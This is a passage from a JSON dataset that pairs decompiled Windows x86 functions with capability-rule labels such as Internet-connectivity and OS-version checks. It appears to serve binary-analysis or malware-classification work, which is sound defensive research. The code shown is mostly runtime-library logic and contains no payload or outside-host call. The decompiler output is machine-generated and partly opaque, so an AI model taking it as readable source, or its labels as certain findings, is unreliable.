(piVar6 == NULL) < 0) {\n        piVar13 = NULL;\n    }\n    piStack36 = piVar13;\n    uVar15 = *(param_5 + 0x14) & 0x1c0;\n    if (uVar15 == 0x40) {\n        uStack92 = param_3;\n        uStack56 = uStack56 & 0xffffff00 | param_3 & 0xff;\n        if (piStack48 != NULL) {\n            piVar6 = piStack84;\n            if (piStack64 < 0x10) {\n                piVar6 = &stack0xffffffac;\n            }\n            piStack44 = param_4;\n            uStack52 = piStack48;\n            do {\n                if (param_4 == NULL) {\ncode_r0x0041d2c0:\n                    uStack56 = CONCAT31(uStack56._1_3_, 1);\n                }\n                else {\n                    uStack40 = piVar6;\n                    uVar4 = *piVar6;\n                    piVar6 = param_4[8];\n                    puVar8 = *piVar6;\n                    if (puVar8 == NULL) {\ncode_r0x0041d300:\n                        uStack20 = 5;\n                        iVar9 = (**(*param_4 + 0xc))(uVar4);\n                        piVar6 = uStack40;\n                        param_4 = piStack44;\n                        if (iVar9 == -1) goto code_r0x0041d2c0;\n                    }\n                    else {\n                        iVar9 = *param_4[0xc];\n                        if (iVar9 < 1) goto code_r0x0041d300;\n                        *param_4[0xc] = iVar9 + -1;\n                        *piVar6 = puVar8 + 1;\n                        *puVar8 = uVar4;\n                        piVar6 = uStack40;\n                    }\n                }\n                piVar6 = piVar6 + 1;\n                uStack52 = uStack52 - 1;\n            } while (uStack52 != NULL);\n        }\n        uStack52 = uStack56 & 0xff | uStack92 & 0xffffff00;\n    }\n    else {\n        if (uVar15 == 0x100) {\n            uStack92 = param_3;\n            uStack56 = uStack56 & 0xffffff00 | param_3 & 0xff;\n            piStack44 = param_4;\n            if (piStack48 != NULL) {\n                piVar6 = piStack84;\n                piVar12 = piStack48;\n                if (piStack64 < 0x10) {\n                    piVar6 = &stack0xffffffac;\n                }\n                do {\n                    piVar11 = piVar12;\n                    if (param_4 == NULL) {\ncode_r0x0041d230:\n                        uStack56 = CONCAT31(uStack56._1_3_, 1);\n                    }\n                    else {\n                        uStack52 = piVar12;\n                        uStack40 = piVar6;\n                        uVar4 = *piVar6;\n                        piVar6 = param_4[8];\n                        puVar8 = *piVar6;\n                        if (puVar8 == NULL) {\ncode_r0x0041d280:\n                            uStack20 = 5;\n                            iVar9 = (**(*param_4 + 0xc))(uVar4);\n                            piVar13 = piStack36;\n                            piVar6 = uStack40;\n                            piVar11 = uStack52;\n                            param_4 = piStack44;\n                            if (iVar9 == -1) goto code_r0x0041d230;\n                        }\n                        else {\n                            iVar9 = *param_4[0xc];\n                            if (iVar9 < 1) goto code_r0x0041d280;\n                            *param_4[0xc] = iVar9 + -1;\n                            *piVar6 = puVar8 + 1;\n                            *puVar8 = uVar4;\n                            piVar13 = piStack36;\n                            piVar6 = uStack40;\n                            piVar11 = uStack52;\n                        }\n                    }\n                    piVar6 = piVar6 + 1;\n                    piVar12 = piVar11 - 1U;\n                } while (piVar11 - 1U != NULL);\n            }\n            if (piVar13 != NULL) {\n                uStack40 = param_6;\n                piStack36 = piVar13;\n                do {\n                    if (param_4 == NULL) {\ncode_r0x0041d1b0:\n                        uStack56 = CONCAT31(uStack56._1_3_, 1);\n                    }\n                    else {\n                        ppuVar5 = param_4[8];\n                        puVar2 = *ppuVar5;\n                        if (puVar2 == NULL) {\ncode_r0x0041d1f0:\n                            uStack20 = 5;\n                            iVar9 = (**(*param_4 + 0xc))(uStack40);\n                            param_4 = piStack44;\n                            if (iVar9 == -1) goto code_r0x0041d1b0;\n                        }\n                        else {\n                            iVar9 = *param_4[0xc];\n                            if (iVar9 < 1) goto code_r0x0041d1f0;\n                            *param_4[0xc] = iVar9 + -1;\n                            *ppuVar5 = puVar2 + 1;\n                            *puVar2 = param_6;\n                        }\n                    }\n                    piStack36 = piStack36 + -1;\n                } while (piStack36 != NULL);\n            }\n            uVar15 = uStack92;\n        }\n        else {\n            uStack56 = param_3;\n            uStack52 = uStack52 & 0xffffff00 | param_3 & 0xff;\n            piStack44 = param_4;\n            if (piVar13 != NULL) {\n                uStack40 = param_6;\n                do {\n                    if (param_4 == NULL) {\ncode_r0x0041d120:\n                        uStack52 = CONCAT31(uStack52._1_3_, 1);\n                    }\n                    else {\n                        ppuVar5 = param_4[8];\n                        puVar2 = *ppuVar5;\n                        if (puVar2 == NULL) {\ncode_r0x0041d160:\n                            uStack20 = 5;\n                            iVar9 = (**(*param_4 + 0xc))(uStack40);\n                            param_4 = piStack44;\n                            if (iVar9 == -1) goto code_r0x0041d120;\n                        }\n                        else {\n                            iVar9 = *param_4[0xc];\n                            if (iVar9 < 1) goto code_r0x0041d160;\n                            *param_4[0xc] = iVar9 + -1;\n                            *ppuVar5 = puVar2 + 1;\n                            *puVar2 = param_6;\n                        }\n                    }\n                    piStack36 = piStack36 + -1;\n                } while (piStack36 != NULL);\n            }\n            if (piStack48 != NULL) {\n                piStack36 = piStack84;\n                piVar6 = piStack48;\n                if (piStack64 < 0x10) {\n                    piStack36 = &stack0xffffffac;\n                }\n                do {\n                    piVar13 = piVar6;\n                    if (param_4 == NULL) {\ncode_r0x0041d350:\n                        uStack52 = CONCAT31(uStack52._1_3_, 1);\n                    }\n                    else {\n                        uStack40 = piVar6;\n                        uVar4 = *piStack36;\n                        piVar6 = param_4[8];\n                        puVar8 = *piVar6;\n                        if (puVar8 == NULL) {\ncode_r0x0041d390:\n                            uStack20 = 5;\n                            iVar9 = (**(*param_4 + 0xc))(uVar4);\n                            piVar13 = uStack40;\n                            param_4 = piStack44;\n                            if (iVar9 == -1) goto code_r0x0041d350;\n                        }\n                        else {\n                            iVar9 = *param_4[0xc];\n                            if (iVar9 < 1) goto code_r0x0041d390;\n                            *param_4[0xc] = iVar9 + -1;\n                            *piVar6 = puVar8 + 1;\n                            *puVar8 = uVar4;\n                            piVar13 = uStack40;\n                        }\n                    }\n                    piStack36 = piStack36 + 1;\n                    piVar6 = piVar13 - 1U;\n                } while (piVar13 - 1U != NULL);\n            }\n            uVar15 = uStack56;\n            uStack56._0_1_ = uStack52;\n        }\n        uStack52 = uStack56 | uVar15 & 0xffffff00;\n        piStack36 = NULL;\n    }\n    uStack40 = uStack40 & 0xffffff00 | uStack52 & 0xff;\n    piVar6 = piStack60 - piStack48;\n    piStack44 = param_4;\n    if (piVar6 != NULL) {\n        piVar13 = piStack84;\n        if (piStack64 < 0x10) {\n            piVar13 = &stack0xffffffac;\n        }\n        piVar13 = piVar13 + piStack48;\n        do {\n            if (param_4 == NULL) {\ncode_r0x0041d400:\n                uStack40 = CONCAT31(uStack40._1_3_, 1);\n            }\n            else {\n                piStack60 = piVar6;\n                piStack48 = piVar13;\n                uVar4 = *piVar13;\n                piVar6 = param_4[8];\n                puVar8 = *piVar6;\n                if (puVar8 == NULL) {\ncode_r0x0041d440:\n                    uStack20 = 5;\n                    iVar9 = (**(*param_4 + 0xc))(uVar4);\n                    piVar6 = piStack60;\n                    piVar13 = piStack48;\n                    param_4 = piStack44;\n                    if (iVar9 == -1) goto code_r0x0041d400;\n                }\n                else {\n                    iVar9 = *param_4[0xc];\n                    if (iVar9 < 1) goto code_r0x0041d440;\n                    *param_4[0xc] = iVar9 + -1;\n                    *piVar6 = puVar8 + 1;\n                    *puVar8 = uVar4;\n                    piVar6 = piStack60;\n                    piVar13 = piStack48;\n                }\n            }\n            piVar13 = piVar13 + 1;\n            piVar6 = piVar6 + -1;\n        } while (piVar6 != NULL);\n    }\n    uStack52 = uStack52 & 0xffffff00;\n    uVar15 = uStack40 & 0xff | uStack52;\n    *(param_5 + 0x24) = 0;\n    *(param_5 + 0x20) = 0;\n    if (piStack36 != NULL) {\n        piStack48 = param_6;\n        piVar6 = piStack36;\n        do {\n            if (param_4 == NULL) {\ncode_r0x0041d4b0:\n                uStack40 = CONCAT31(uStack40._1_3_, 1);\n            }\n            else {\n                ppuVar5 = param_4[8];\n                puVar2 = *ppuVar5;\n                piStack36 = piVar6;\n                if (puVar2 == NULL) {\ncode_r0x0041d4f0:\n                    uStack20 = 5;\n                    iVar9 = (**(*param_4 + 0xc))(piStack48);\n                    piVar6 = piStack36;\n                    param_4 = piStack44;\n                    if (iVar9 == -1) goto code_r0x0041d4b0;\n                }\n                else {\n                    iVar9 = *param_4[0xc];\n                    if (iVar9 < 1) goto code_r0x0041d4f0;\n                    *param_4[0xc] = iVar9 + -1;\n                    *ppuVar5 = puVar2 + 1;\n                    *puVar2 = param_6;\n                }\n            }\n            piVar6 = piVar6 + -1;\n        } while (piVar6 != NULL);\n        uVar15 = uStack52 | uStack40 & 0xff;\n    }\n    *param_2 = uVar15;\n    param_2[1] = param_4;\n    if (0xf < uStack100) {\n        piVar6 = piStack120;\n        if ((0xfff < uStack100 + 1) && (piVar6 = piStack120[-1],  0x1f < piStack120 + (-4 - piVar6))) {\ncode_r0x0041d5ab:\n            uStack20 = 1;\n            fcn.004047f5();\n            goto code_r0x0041d5b7;\n        }\n        fcn.00401a32(piVar6);\n    }\n    if (0xf < piStack64) {\n        piVar6 = piStack84;\n        if ((0xfff < piStack64 + 1U) && (piVar6 = piStack84[-1],  0x1f < piStack84 + (-4 - piVar6))) {\ncode_r0x0041d5b7:\n            uStack20 = 2;\n            puVar10 = fcn.004047f5();\n            if ((piStack68 != NULL) && (puVar10 = (**(*piStack68 + 8))(),  puVar10 != NULL)) {\n                puVar10 = (***puVar10)(1);\n            }\n            return puVar10;\n        }\n        fcn.00401a32(piVar6);\n    }\n    *in_FS_OFFSET = iStack28;\n    return param_2;\n}\n",
        "token_count": 4847
    },
    "0040380a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040380a(int32_t arg_8h)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    if (((arg_8h == 0) || (uVar2 = fcn.00403e18(arg_8h, 0x55),  0x54 < uVar2)) ||\n       (iVar3 = fcn.00403ff3(uVar2 * 2 + 2),  iVar3 == 0)) {\n        iVar3 = 0;\n    }\n    else {\n        iVar4 = fcn.00405a92(iVar3, uVar2 + 1, arg_8h, uVar2 + 1);\n        if (iVar4 != 0) {\n            fcn.004035f8(0, 0, 0, 0, 0);\n            pcVar1 = swi(3);\n            iVar3 = (*pcVar1)();\n            return iVar3;\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 240
    },
    "00403819": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403819(int32_t *arg_8h, int32_t arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    char cVar1;\n    uint *puVar2;\n    \n    if (*arg_8h == 0) {\n        *arg_8h = arg_ch;\n        *(arg_8h + 1) = arg_10h;\n        arg_8h[3] = arg_14h;\n    }\n    else {\n        cVar1 = fcn.00402059(arg_8h, arg_ch, arg_10h, arg_14h);\n        if (cVar1 == '\\0') {\n            puVar2 = fcn.004039a4();\n            *puVar2 = 0x16;\n            fcn.00403751();\n            return 0;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 198
    },
    "0040383c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.0040383c(uint *arg_8h)\n\n{\n    uint uVar1;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    if (**0x56f458 == '\\0') {\n        fcn.004017df(1);\n        return arg_8h;\n    }\n    fcn.004053d5(&var_10h);\n    fcn.004032bf(&var_8h, 0x7b);\n    if (**0x56f458 != '@') {\n        uVar1 = fcn.00402919(&var_10h, 0, 0);\n        fcn.00402eb9(uVar1);\n        fcn.00403cba(0x3a);\n        uVar1 = fcn.00403deb(&var_10h);\n        fcn.00402eb9(uVar1);\n    }\n    fcn.00403cba(0x7d);\n    if (**0x56f458 == '@') {\n        *0x56f458 = *0x56f458 + 1;\n        *arg_8h = var_8h;\n        arg_8h[1] = var_4h;\n    }\n    else {\n        arg_8h[1] = 0;\n        *(arg_8h + 1) = 2;\n        *arg_8h = 0;\n    }\n    return arg_8h;\n}\n",
        "token_count": 324
    },
    "004038b4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004038b4(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t arg_ch;\n    int32_t iVar2;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    if ((*(param_1 + 0x3c) == '\\0') && (iVar2 = 0,  0 < *(param_1 + 0x38))) {\n        arg_ch = *(param_1 + 0x34);\n        do {\n            var_4h = var_4h & 0xffff0000;\n            iVar1 = fcn.0040105f(&var_4h, arg_ch, *(**(param_1 + 8) + 4), *(param_1 + 8));\n            if (iVar1 < 1) {\n                *(param_1 + 0x18) = 0xffffffff;\n                return 1;\n            }\n            fcn.004016ae(var_4h, param_1 + 0x18);\n            arg_ch = arg_ch + iVar1;\n            iVar2 = iVar2 + 1;\n        } while (iVar2 != *(param_1 + 0x38));\n    }\n    else {\n        fcn.00402937(*(param_1 + 0x34), *(param_1 + 0x38), param_1 + 0x18);\n    }\n    return 1;\n}\n",
        "token_count": 318
    },
    "004038cd": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004df3b9)\n\nuint32_t __cdecl fcn.004038cd(uint8_t *arg_8h, uint8_t *arg_ch, uint32_t arg_10h)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar4;\n    uint32_t uVar2;\n    uint *puVar3;\n    bool bVar5;\n    \n    if (*0x57004c != 0) {\n        uVar2 = fcn.004038d7(arg_8h, arg_ch, arg_10h, 0);\n        return uVar2;\n    }\n    if ((arg_8h == NULL) || (arg_ch == NULL)) {\n        puVar3 = fcn.004039a4();\n        *puVar3 = 0x16;\n        fcn.00403751();\n    }\n    else {\n        if (arg_10h < 0x80000000) {\n            if (arg_10h != 0) {\n                do {\n                    uVar4 = *arg_8h;\n                    uVar1 = *arg_ch;\n                    if ((uVar4 == 0) || (uVar1 == 0)) break;\n                    arg_8h = arg_8h + 1;\n                    arg_ch = arg_ch + 1;\n                    if ((0x40 < uVar4) && (uVar4 < 0x5b)) {\n                        uVar4 = uVar4 + 0x20;\n                    }\n                    if ((0x40 < uVar1) && (uVar1 < 0x5b)) {\n                        uVar1 = uVar1 + 0x20;\n                    }\n                    bVar5 = uVar4 < uVar1;\n                    if (uVar4 != uVar1) goto code_r0x004e01f1;\n                    arg_10h = arg_10h - 1;\n                } while (arg_10h != 0);\n                arg_10h = 0;\n                bVar5 = uVar4 < uVar1;\n                if (uVar4 != uVar1) {\ncode_r0x004e01f1:\n                    arg_10h = 0xffffffff;\n                    if (!bVar5) {\n                        arg_10h = 1;\n                    }\n                }\n            }\n            return arg_10h;\n        }\n        puVar3 = fcn.004039a4();\n        *puVar3 = 0x16;\n        fcn.00403751();\n    }\n    return 0x7fffffff;\n}\n",
        "token_count": 562
    },
    "00419180": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\ncode ** __thiscall fcn.00419180(code **param_1, int32_t param_2)\n\n{\n    code **ppcVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_1ch;\n    int32_t var_8h;\n    code **var_20h;\n    uint *puStack32;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    puStack32 = &var_20h;\n    var_14h = 0x41e390;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    *param_1 = vtable.std::exception.0;\n    var_10h = 0;\n    var_20h = param_1;\n    fcn.00405a60(param_1 + 1);\n    ppcVar1 = var_20h;\n    if (var_8h != 0) {\n        fcn.00401e7e(var_20h);\n    }\n    *in_FS_OFFSET = var_18h;\n    return ppcVar1;\n}\n",
        "token_count": 251
    },
    "004038d7": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.004038d7(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h, uint arg_14h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_4h;\n    \n    fcn.004057e5(arg_14h);\n    if (arg_10h == 0) {\n        iVar3 = 0;\n    }\n    else if ((arg_8h == 0) || (arg_ch == 0)) {\n        puVar1 = fcn.004039a4();\n        *puVar1 = 0x16;\n        fcn.00403751();\n        iVar3 = 0x7fffffff;\n    }\n    else {\n        iVar3 = 0x7fffffff;\n        if (arg_10h < 0x80000000) {\n            if (*(var_ch + 0xa4) == 0) {\n                iVar3 = fcn.004035ee(arg_8h, arg_ch, arg_10h, &var_ch);\n            }\n            else {\n                iVar2 = fcn.00402964(&var_ch, *(var_ch + 0xa4), 0x1001, arg_8h, arg_10h, arg_ch, arg_10h, \n                                     *(var_ch + 0x10));\n                if (iVar2 == 0) {\n                    puVar1 = fcn.004039a4();\n                    *puVar1 = 0x16;\n                }\n                else {\n                    iVar3 = iVar2 + -2;\n                }\n            }\n        }\n        else {\n            puVar1 = fcn.004039a4();\n            *puVar1 = 0x16;\n            fcn.00403751();\n        }\n    }\n    if (var_4h != '\\0') {\n        *(var_10h + 0x350) = *(var_10h + 0x350) & 0xfffffffd;\n    }\n    return iVar3;\n}\n",
        "token_count": 475
    },
    "0040391d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040391d(uint32_t *arg_8h)\n\n{\n    uint16_t uVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        uVar1 = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar3 = *(in_ECX + 0xaa8);\n        if (99 < uVar3) {\n            puVar2 = fcn.004039a4();\n            *puVar2 = 0x16;\n            uVar3 = fcn.00403751();\n            return uVar3 & 0xffffff00;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.00403819(in_ECX + 0x464 + uVar3 * 0x10, 1, *(in_ECX + 0x32), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        uVar1 = **(in_ECX + 0x46c + uVar3 * 0x10);\n    }\n    *arg_8h = uVar1;\n    arg_8h[1] = 0;\n    return CONCAT31(uVar1 >> 8, 1);\n}\n",
        "token_count": 342
    },
    "00403931": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_50h\n// WARNING: Variable defined which should be unmapped: var_4ch\n// WARNING: Variable defined which should be unmapped: var_48h\n// WARNING: Variable defined which should be unmapped: var_44h\n// WARNING: Variable defined which should be unmapped: var_40h\n\nvoid __cdecl\nfcn.00403931(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uint noname_0;\n    uint arg_10h_00;\n    uint arg_14h_00;\n    char cVar3;\n    ushort uVar4;\n    uint *puVar5;\n    int32_t *piVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uint uVar9;\n    int32_t iVar10;\n    int32_t unaff_EBP;\n    char *pcVar11;\n    int32_t iVar12;\n    uint32_t arg_1ch_00;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_2ch;\n    int32_t var_28h;\n    uint var_18h;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.0040536c(100);\n    uVar7 = *(unaff_EBP + 0x24);\n    iVar10 = *(unaff_EBP + 0x18);\n    pcVar11 = *(unaff_EBP + 0x20);\n    *(unaff_EBP + -0x70) = *(unaff_EBP + 0xc);\n    *(unaff_EBP + -0x68) = iVar10;\n    *(unaff_EBP + -0x50) = uVar7;\n    if ((uVar7 == 0) || ((*pcVar11 != '+' && (*pcVar11 != '-')))) {\n        arg_1ch_00 = 0;\n    }\n    else {\n        arg_1ch_00 = 1;\n    }\n    if ((*(iVar10 + 0x14) & 0x3000) == 0x3000) {\n        uVar9 = 0x54d9fc;\n        if (((arg_1ch_00 + 2 <= uVar7) && (pcVar11[arg_1ch_00] == '0')) &&\n           ((pcVar11[arg_1ch_00 + 1] == 'x' || (pcVar11[arg_1ch_00 + 1] == 'X')))) {\n            arg_1ch_00 = arg_1ch_00 + 2;\n        }\n    }\n    else {\n        uVar9 = 0x54d9f8;\n    }\n    uVar9 = fcn.004026f8(pcVar11, uVar9);\n    *(unaff_EBP + -0x60) = uVar9;\n    *(unaff_EBP + -0x44) = 0x2e;\n    puVar5 = fcn.00401366();\n    *(unaff_EBP + -0x44) = **puVar5;\n    uVar9 = fcn.004026f8(pcVar11, unaff_EBP + -0x44);\n    *(unaff_EBP + -0x54) = uVar9;\n    fcn.0040327e(*(iVar10 + 0x30));\n    *(unaff_EBP + -4) = 0;\n    uVar9 = fcn.0040342c(unaff_EBP + -0x5c);\n    *(unaff_EBP + -4) = 0xffffffff;\n    *(unaff_EBP + -0x48) = uVar9;\n    fcn.004050a6();\n    fcn.00405510(*(unaff_EBP + -0x50), 0);\n    iVar12 = unaff_EBP + -0x28;\n    *(unaff_EBP + -4) = 1;\n    if (7 < *(unaff_EBP + -0x14)) {\n        iVar12 = *(unaff_EBP + -0x28);\n    }\n    fcn.00402bdf(pcVar11, pcVar11 + *(unaff_EBP + -0x50), iVar12);\n    fcn.0040327e(*(iVar10 + 0x30));\n    *(unaff_EBP + -4) = 2;\n    piVar6 = fcn.004053a8(unaff_EBP + -0x4c);\n    *(unaff_EBP + -4) = 1;\n    *(unaff_EBP + -0x58) = piVar6;\n    fcn.004050a6();\n    pcVar1 = *(*piVar6 + 0x14);\n    (**0x573000)(unaff_EBP + -0x40);\n    (*pcVar1)();\n    *(unaff_EBP + -4) = 3;\n    uVar7 = fcn.004017d0();\n    iVar12 = *(unaff_EBP + -0x54);\n    uVar7 = uVar7 & 0xffff;\n    *(unaff_EBP + -0x48) = uVar7;\n    if (iVar12 == *(unaff_EBP + -0x50)) {\n        *(unaff_EBP + -0x54) = *(unaff_EBP + -0x60);\n    }\n    else {\n        uVar4 = fcn.00406104();\n        iVar8 = unaff_EBP + -0x28;\n        if (7 < *(unaff_EBP + -0x14)) {\n            iVar8 = *(unaff_EBP + -0x28);\n        }\n        uVar7 = *(unaff_EBP + -0x48);\n        *(iVar8 + iVar12 * 2) = uVar4;\n    }\n    pcVar11 = unaff_EBP + -0x40;\n    if (0xf < *(unaff_EBP + -0x2c)) {\n        pcVar11 = *(unaff_EBP + -0x40);\n    }\n    cVar3 = *pcVar11;\n    if (cVar3 != '\\x7f') {\n        iVar10 = *(unaff_EBP + -0x54);\n        do {\n            if ((cVar3 < '\\x01') || (iVar10 - arg_1ch_00 <= cVar3)) break;\n            iVar10 = iVar10 - cVar3;\n            fcn.0040594d(iVar10, 1, uVar7);\n            if ('\\0' < pcVar11[1]) {\n                pcVar11 = pcVar11 + 1;\n            }\n            cVar3 = *pcVar11;\n            uVar7 = *(unaff_EBP + -0x48);\n        } while (cVar3 != '\\x7f');\n        iVar10 = *(unaff_EBP + -0x68);\n    }\n    iVar12 = *(iVar10 + 0x24);\n    uVar7 = *(unaff_EBP + -0x18);\n    *(unaff_EBP + -0x68) = uVar7;\n    if ((iVar12 < 0) || (((iVar12 < 1 && (*(iVar10 + 0x20) == 0)) || (*(iVar10 + 0x20) <= uVar7)))) {\n        iVar12 = 0;\n    }\n    else {\n        iVar12 = *(iVar10 + 0x20) - uVar7;\n    }\n    uVar7 = *(iVar10 + 0x14) & 0x1c0;\n    if (uVar7 == 0x40) {\n        var_28h = unaff_EBP + -0x28;\n        if (7 < *(unaff_EBP + -0x14)) {\n            var_28h = *(unaff_EBP + -0x28);\n        }\n        var_2ch = *(unaff_EBP + 0x14);\n        uVar9 = *(unaff_EBP + 0x10);\n    }\n    else {\n        if (uVar7 == 0x100) {\n            iVar8 = unaff_EBP + -0x28;\n            if (7 < *(unaff_EBP + -0x14)) {\n                iVar8 = *(unaff_EBP + -0x28);\n            }\n            puVar5 = fcn.00404e0d(*(unaff_EBP + 8), unaff_EBP + -100, *(unaff_EBP + 0x10), *(unaff_EBP + 0x14), iVar8, \n                                  arg_1ch_00);\n            uVar9 = *puVar5;\n            uVar2 = puVar5[1];\n            *(unaff_EBP + 0x14) = uVar2;\n            *(unaff_EBP + 0x10) = uVar9;\n            puVar5 = fcn.004014c9(*(unaff_EBP + 8), unaff_EBP + -100, uVar9, uVar2, *(unaff_EBP + 0x1c), iVar12);\n            iVar12 = 0;\n            goto code_r0x0046ca78;\n        }\n        puVar5 = fcn.004014c9(*(unaff_EBP + 8), unaff_EBP + -100, *(unaff_EBP + 0x10), *(unaff_EBP + 0x14), \n                              *(unaff_EBP + 0x1c), iVar12);\n        iVar12 = 0;\n        uVar9 = *puVar5;\n        var_2ch = puVar5[1];\n        var_28h = unaff_EBP + -0x28;\n        *(unaff_EBP + 0x10) = uVar9;\n        *(unaff_EBP + 0x14) = var_2ch;\n        if (7 < *(unaff_EBP + -0x14)) {\n            var_28h = *(unaff_EBP + -0x28);\n        }\n    }\n    puVar5 = fcn.00404e0d(*(unaff_EBP + 8), unaff_EBP + -100, uVar9, var_2ch, var_28h, arg_1ch_00);\ncode_r0x0046ca78:\n    uVar9 = puVar5[1];\n    uVar2 = *puVar5;\n    *(unaff_EBP + 0x10) = uVar2;\n    *(unaff_EBP + 0x14) = uVar9;\n    *(unaff_EBP + -0x48) = unaff_EBP + -0x28;\n    if (7 < *(unaff_EBP + -0x14)) {\n        *(unaff_EBP + -0x48) = *(unaff_EBP + -0x28);\n    }\n    noname_0 = *(unaff_EBP + 8);\n    puVar5 = fcn.00404e0d(noname_0, unaff_EBP + -0x6c, uVar2, uVar9, *(unaff_EBP + -0x48) + arg_1ch_00 * 2, \n                          *(unaff_EBP + -0x68) - arg_1ch_00);\n    uVar9 = *(unaff_EBP + 0x1c);\n    uVar2 = *(unaff_EBP + -0x70);\n    arg_10h_00 = *puVar5;\n    arg_14h_00 = puVar5[1];\n    *(iVar10 + 0x20) = 0;\n    *(iVar10 + 0x24) = 0;\n    *(unaff_EBP + 0x10) = arg_10h_00;\n    *(unaff_EBP + 0x14) = arg_14h_00;\n    fcn.004014c9(noname_0, uVar2, arg_10h_00, arg_14h_00, uVar9, iVar12);\n    fcn.004029b9();\n    fcn.00405ad3();\n    fcn.004067d0();\n    return;\n}\n",
        "token_count": 2878
    },
    "00403959": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nushort __fastcall fcn.00403959(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    ushort *puVar2;\n    code *pcVar3;\n    ushort uVar4;\n    \n    if ((*param_1[7] != 0) && (piVar1 = param_1[0xb],  0 < *piVar1)) {\n        *piVar1 = *piVar1 + -1;\n        puVar2 = *param_1[7];\n        *param_1[7] = puVar2 + 1;\n        return *puVar2;\n    }\n    pcVar3 = *(*param_1 + 0x1c);\n    (**0x573000)();\n    uVar4 = (*pcVar3)();\n    return uVar4;\n}\n",
        "token_count": 176
    },
    "004039ae": {
        "rules": [
